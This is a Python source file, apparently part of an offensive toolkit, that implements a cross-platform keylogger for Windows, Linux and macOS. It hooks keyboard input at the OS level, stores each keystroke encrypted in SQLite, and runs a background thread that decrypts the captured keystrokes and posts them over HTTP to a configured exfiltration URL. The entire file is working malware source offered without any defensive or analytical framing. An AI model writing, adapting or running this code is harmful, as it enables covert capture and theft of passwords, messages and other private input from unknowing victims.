import os
import sys
import threading
import time
import sqlite3
import traceback
from pathlib import Path

from modules.logger import log_event
from modules.config import load_config

cfg = load_config().get("keylogger", {})
LOG_INTERVAL = cfg.get("log_interval", 300)
DB_PATH = cfg.get("db_path", "/opt/bismillah_repo/keystrokes.db")

# AES‐GCM key and nonce for encrypting keystrokes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
KEY = bytes.fromhex(load_config().get("logging", {}).get("aes_key", "")[:64])
NONCE = bytes.fromhex(load_config().get("logging", {}).get("aes_iv", "")[:24])[:12]

# Platform flags
IS_WIN = sys.platform == "win32"
IS_MAC = sys.platform == "darwin"
IS_LIN = sys.platform.startswith("linux")

# Enhancement: Exfiltration and log rotation
EXFIL_URL = cfg.get("exfil_url") or os.getenv("KEYLOG_EXFIL_URL")
ROTATE_INTERVAL = cfg.get("rotate_interval", 3600)
MAX_ROWS = cfg.get("max_rows", 10000)

def _ensure_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp INTEGER,
        keystroke BLOB
    )
    """)
    conn.commit()
    conn.close()

def _encrypt_keystroke(text: str) -> bytes:
    aesgcm = AESGCM(KEY)
    return aesgcm.encrypt(NONCE, text.encode(errors="ignore"), None)

def _exfiltrate_logs():
    if not EXFIL_URL:
        return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT timestamp, keystroke FROM keys")
        rows = c.fetchall()
        conn.close()
        # Decrypt for exfil
        logs = []
        for ts, blob in rows:
            try:
                pt = AESGCM(KEY).decrypt(NONCE, blob, None).decode(errors="ignore")
            except Exception:
                pt = "<DECRYPTION_ERROR>"
            logs.append({"timestamp": ts, "keystroke": pt})
        import requests
        requests.post(EXFIL_URL, json=logs, timeout=10)
        log_event("keylogger", b"Exfiltrated keystrokes via HTTP POST.")
    except Exception as e:
        log_event("keylogger", f"Exfiltration failed: {e}".encode())

def _rotate_logs():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM keys")
        count = c.fetchone()[0]
        if count > MAX_ROWS:
            c.execute("DELETE FROM keys WHERE id IN (SELECT id FROM keys ORDER BY id ASC LIMIT ?)", (count - MAX_ROWS,))
            conn.commit()
        conn.close()
    except Exception as e:
        log_event("keylogger", f"Log rotation failed: {e}".encode())

# Windows Keylogger
if IS_WIN:
    import pythoncom
    import pyWinhook as pyhook
    import win32con

    class WindowsKeyLogger:
        def __init__(self):
            self.hm = pyhook.HookManager()
            self.hm.KeyDown = self.on_key
            self.hm.HookKeyboard()

        def on_key(self, event):
            try:
                char = chr(event.Ascii)
            except:
                char = f"[{event.Key}]"
            data = _encrypt_keystroke(char)
            ts = int(time.time())
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
            conn.commit()
            conn.close()
            return True

        def start(self):
            import pythoncom
            pythoncom.PumpMessages()

# Linux Keylogger (evdev)
elif IS_LIN:
    from evdev import InputDevice, categorize, ecodes, list_devices

    class LinuxKeyLogger:
        def __init__(self):
            self.devices = []
            for dev_path in list_devices():
                dev = InputDevice(dev_path)
                if 'keyboard' in dev.name.lower() or 'event' in dev.name.lower():
                    self.devices.append(dev)

        def start(self):
            for dev in self.devices:
                threading.Thread(target=self.listen, args=(dev,), daemon=True).start()

        def listen(self, dev):
            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    key = categorize(event)
                    text = key.keycode if isinstance(key.keycode, str) else str(key.keycode)
                    data = _encrypt_keystroke(text)
                    ts = int(time.time())
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
                    conn.commit()
                    conn.close()

# macOS Keylogger (Quartz)
elif IS_MAC:
    from AppKit import NSApplication
    from PyObjCTools import AppHelper
    import Quartz

    class MacOSKeyLogger:
        def __init__(self):
            self.event_mask = Quartz.kCGEventMaskForAllEvents()
            self.tap = Quartz.CGEventTapCreate(
                Quartz.kCGHIDEventTap,
                Quartz.kCGHeadInsertEventTap,
                Quartz.kCGEventTapOptionDefault,
                Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown),
                self.callback,
                None
            )
            self.run_loop_source = Quartz.CFMachPortCreateRunLoopSource(None, self.tap, 0)
            Quartz.CFRunLoopAddSource(
                Quartz.CFRunLoopGetCurrent(),
                self.run_loop_source,
                Quartz.kCFRunLoopCommonModes
            )
            Quartz.CGEventTapEnable(self.tap, True)

        def callback(self, proxy, type_, event, refcon):
            keycode = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
            text = str(keycode)
            data = _encrypt_keystroke(text)
            ts = int(time.time())
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
            conn.commit()
            conn.close()
            return event

        def start(self):
            AppHelper.runConsoleEventLoop()

def keylogger_loop():
    _ensure_db()
    # Enhancement: background exfiltration and log rotation
    def exfil_worker():
        while True:
            time.sleep(ROTATE_INTERVAL)
            _exfiltrate_logs()
            _rotate_logs()
    threading.Thread(target=exfil_worker, daemon=True).start()
    try:
        if IS_WIN:
            kl = WindowsKeyLogger()
            log_event("keylogger", b"Starting Windows keylogger.")
            kl.start()
        elif IS_LIN:
            kl = LinuxKeyLogger()
            log_event("keylogger", b"Starting Linux keylogger.")
            kl.start()
        elif IS_MAC:
            kl = MacOSKeyLogger()
            log_event("keylogger", b"Starting macOS keylogger.")
            kl.start()
    except Exception as e:
        tb = traceback.format_exc()
        log_event("keylogger", f"Keylogger error: {tb}".encode())
